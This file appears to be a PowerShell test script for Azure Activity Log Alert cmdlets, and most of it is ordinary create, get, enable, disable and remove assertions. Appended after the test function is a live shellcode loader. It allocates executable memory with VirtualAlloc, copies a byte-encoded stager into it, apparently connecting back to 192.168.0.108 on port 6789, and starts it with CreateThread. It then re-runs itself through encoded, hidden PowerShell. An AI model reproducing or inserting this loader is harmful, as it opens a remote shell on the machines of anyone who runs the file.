














function Test-SetGetListUpdateRemoveActivityLogAlert
{
	Write-Output "Starting Test-AddActivityLogAlert" 

    
	$resourceGroupName = 'Default-ActivityLogAlerts'
	$alertName = 'andy0307rule'
	$location = 'Global'

	try
	{
		Write-Verbose " ****** Creating a new LeafCondition object"
		$condition1 = New-AzActivityLogAlertCondition -Field 'field1' -Equal 'equals1'

		Assert-NotNull $condition1
		Assert-AreEqual 'field1' $condition1.Field
		Assert-AreEqual 'equals1' $condition1.Equals

        $condition2 = New-AzActivityLogAlertCondition -Field 'field2' -Equal 'equals2'

		Assert-NotNull $condition1
		Assert-AreEqual 'field1' $condition1.Field
		Assert-AreEqual 'equals1' $condition1.Equals

		Write-Verbose " ****** Creating a new ActionGroup object"
		
		$dict = New-Object "System.Collections.Generic.Dictionary``2[System.String,System.String]"
		$dict.Add('key1', 'value1')

		Assert-NotNull $dict

		$actionGrp1 = New-AzActionGroup -ActionGroupId 'actiongr1' -WebhookProperty $dict

		Assert-NotNull $actionGrp1
		Assert-AreEqual 'actiongr1' $actionGrp1.ActionGroupId
		Assert-NotNull $actionGrp1.WebhookProperties
		Assert-AreEqual 'value1' $actionGrp1.WebhookProperties['key1']

		Write-Verbose " ****** Creating a new ActivityLogAlert"
		$actual = Set-AzActivityLogAlert -Location $location -Name $alertName -ResourceGroupName $resourceGroupName -Scope 'scope1','scope2' -Action $actionGrp1 -Condition $condition1
		

		Assert-NotNull $actual
		Assert-AreEqual $alertName $actual.Name
		Assert-AreEqual $location $actual.Location
		Assert-AreEqual 1 $actual.Actions.Length
		Assert-AreEqual 1 $actual.Condition.Length

		Write-Verbose " ****** Getting the ActivityLogAlerts by subscriptionId"
		$retrievedSubId = Get-AzActivityLogAlert

		Assert-NotNull $retrievedSubId
		Assert-AreEqual 2 $retrievedSubId.Length
		Assert-AreEqual $alertName $retrievedSubId[0].Name
		Assert-AreEqual $location $retrievedSubId[0].Location

		Write-Verbose " ****** Getting the ActivityLogAlerts by resource group"
		$retrievedRg = Get-AzActivityLogAlert -ResourceGroup $resourceGroupName

		Assert-NotNull $retrievedRg
		Assert-AreEqual 1 $retrievedRg.Length
		Assert-AreEqual $alertName $retrievedRg[0].Name
		Assert-AreEqual $location $retrievedRg[0].Location

		Write-Verbose " ****** Getting the ActivityLogAlerts by name"
		$retrieved = Get-AzActivityLogAlert -ResourceGroup $resourceGroupName -Name $alertName
		Assert-NotNull $retrieved
		Assert-AreEqual 1 $retrieved.Length
		Assert-AreEqual $alertName $retrieved[0].Name
		

		Write-Verbose " ****** Creating a new Tags object"
		
		$dict = New-Object "System.Collections.Generic.Dictionary``2[System.String,System.String]"
		$dict.Add('key1', 'value1')

		Assert-NotNull $dict

		Write-Verbose " ****** Patching the ActivityLogAlert"
		Assert-ThrowsContains 
			{
				$updated = Disable-AzActivityLogAlert -ResourceGroupName $resourceGroupName -Name $alertName -Tag $dict

				Assert-NotNull $updated
				Assert-AreEqual $alertName $updated.Name
				Assert-AreEqual $location $updated.Location
				Assert-NotNull $updated.Tags
				Assert-False { $updated.Enabled }
			}
			"BadRequest"

		Assert-ThrowsContains 
			{
				$updated = Disable-AzActivityLogAlert -InputObject $actual

				Assert-NotNull $updated
				Assert-AreEqual $alertName $updated.Name
				Assert-AreEqual $location $updated.Location
				Assert-NotNull $updated.Tags
				Assert-False { $updated.Enabled }
			}
			"BadRequest"

		Assert-ThrowsContains 
			{
				$updated = Disable-AzActivityLogAlert -ResourceId $actual.Id

				Assert-NotNull $updated
				Assert-AreEqual $alertName $updated.Name
				Assert-AreEqual $location $updated.Location
				Assert-NotNull $updated.Tags
				Assert-False { $updated.Enabled }
			}
			"BadRequest"

         Assert-ThrowsContains 
			{
				$updated = Enable-AzActivityLogAlert -ResourceGroupName $resourceGroupName -Name $alertName -Tag $dict

				Assert-NotNull $updated
				Assert-AreEqual $alertName $updated.Name
				Assert-AreEqual $location $updated.Location
				Assert-NotNull $updated.Tags
				Assert-False { $updated.Enabled }
			}
			"BadRequest"

		Assert-ThrowsContains 
			{
				$updated = Enable-AzActivityLogAlert -InputObject $actual

				Assert-NotNull $updated
				Assert-AreEqual $alertName $updated.Name
				Assert-AreEqual $location $updated.Location
				Assert-NotNull $updated.Tags
				Assert-False { $updated.Enabled }
			}
			"BadRequest"

		Assert-ThrowsContains 
			{
				$updated = Enable-AzActivityLogAlert -ResourceId $actual.Id

				Assert-NotNull $updated
				Assert-AreEqual $alertName $updated.Name
				Assert-AreEqual $location $updated.Location
				Assert-NotNull $updated.Tags
				Assert-False { $updated.Enabled }
			}
			"BadRequest"

		Write-Verbose " ****** NOP: setting an activity log alert using the value from the pipe (InputObject)"
		Get-AzActivityLogAlert -ResourceGroup $resourceGroupName -Name $alertName | Set-AzActivityLogAlert

		Write-Verbose " ****** Disabling an activity log alert using the value of ResourceId plus another parameter"
		Set-AzActivityLogAlert -ResourceId '/subscriptions/07c0b09d-9f69-4e6e-8d05-f59f67299cb2/resourceGroups/Default-ActivityLogAlerts/providers/microsoft.insights/activityLogAlerts/andy0307rule' -DisableAlert

		Write-Verbose " ****** Removing the ActivityLogAlert using pileline"
		Get-AzActivityLogAlert -ResourceGroup $resourceGroupName -Name $alertName | Remove-AzActivityLogAlert

		Write-Verbose " ****** Removing (again) the ActivityLogAlert"
		Remove-AzActivityLogAlert -ResourceGroupName $resourceGroupName -Name $alertName

		Write-Verbose " ****** Removing (again) the ActivityLogAlert using ResourceId param"
		Remove-AzActivityLogAlert -ResourceId $actual.Id
    }
    finally
    {
        
        
    }
}

$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x6c,0x68,0x02,0x00,0x1a,0x85,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}

